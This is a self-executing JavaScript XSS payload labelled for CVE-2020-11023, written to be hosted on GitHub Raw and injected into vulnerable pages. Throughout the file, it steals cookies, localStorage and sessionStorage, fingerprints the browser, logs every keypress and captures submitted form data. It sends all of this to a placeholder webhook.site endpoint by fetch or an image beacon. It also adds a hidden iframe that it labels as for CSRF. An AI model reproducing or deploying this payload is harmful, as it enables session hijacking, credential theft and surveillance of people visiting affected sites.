// CVE-2020-11023 XSS Payload
// Host this on GitHub Raw: https://raw.githubusercontent.com/username/repo/main/payload.js

(function() {
    'use strict';
    
    // Configuration
    const config = {
        beaconUrl: 'https://webhook.site/YOUR_WEBHOOK_ID',
        collectCookies: true,
        collectLocalStorage: true,
        collectSessionStorage: true,
        keylog: true,
        screenshot: false,
        fingerprint: true
    };

    // Main exploit function
    function exploit() {
        const data = {
            vulnerability: 'CVE-2020-11023',
            timestamp: new Date().toISOString(),
            url: window.location.href,
            userAgent: navigator.userAgent,
            referrer: document.referrer
        };

        // Collect sensitive data
        if (config.collectCookies) {
            data.cookies = document.cookie;
        }
        
        if (config.collectLocalStorage) {
            data.localStorage = getAllLocalStorage();
        }
        
        if (config.collectSessionStorage) {
            data.sessionStorage = getAllSessionStorage();
        }
        
        if (config.fingerprint) {
            data.fingerprint = getBrowserFingerprint();
        }

        // Send collected data
        sendData(data);
        
        // Additional exploitation
        performAdditionalActions();
    }

    function getAllLocalStorage() {
        const ls = {};
        for (let i = 0; i < localStorage.length; i++) {
            const key = localStorage.key(i);
            ls[key] = localStorage.getItem(key);
        }
        return ls;
    }

    function getAllSessionStorage() {
        const ss = {};
        for (let i = 0; i < sessionStorage.length; i++) {
            const key = sessionStorage.key(i);
            ss[key] = sessionStorage.getItem(key);
        }
        return ss;
    }

    function getBrowserFingerprint() {
        return {
            language: navigator.language,
            platform: navigator.platform,
            plugins: Array.from(navigator.plugins).map(p => p.name),
            screen: {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth
            },
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            hardwareConcurrency: navigator.hardwareConcurrency || 'unknown'
        };
    }

    function sendData(data) {
        // Method 1: Fetch API
        fetch(config.beaconUrl, {
            method: 'POST',
            mode: 'no-cors',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(data)
        }).catch(err => {
            // Fallback: Image beacon
            const img = new Image();
            const encodedData = btoa(JSON.stringify(data));
            img.src = `${config.beaconUrl}?data=${encodedData}`;
        });
    }

    function performAdditionalActions() {
        // Create hidden iframe for CSRF
        const iframe = document.createElement('iframe');
        iframe.style.display = 'none';
        iframe.src = window.location.href;
        document.body.appendChild(iframe);

        // Keylogger
        if (config.keylog) {
            document.addEventListener('keypress', function(e) {
                const keyData = {
                    key: e.key,
                    target: e.target.tagName,
                    timestamp: new Date().toISOString()
                };
                fetch(config.beaconUrl + '/keys', {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify(keyData)
                });
            });
        }

        // Form hijacking
        const forms = document.querySelectorAll('form');
        forms.forEach((form, index) => {
            form.addEventListener('submit', function(e) {
                const formData = new FormData(form);
                const formObj = {};
                for (let [key, value] of formData.entries()) {
                    formObj[key] = value;
                }
                
                fetch(config.beaconUrl + '/forms', {
                    method: 'POST',
                    mode: 'no-cors',
                    body: JSON.stringify({
                        formId: index,
                        action: form.action,
                        data: formObj
                    })
                });
            });
        });
    }

    // Execute exploit
    exploit();
})();
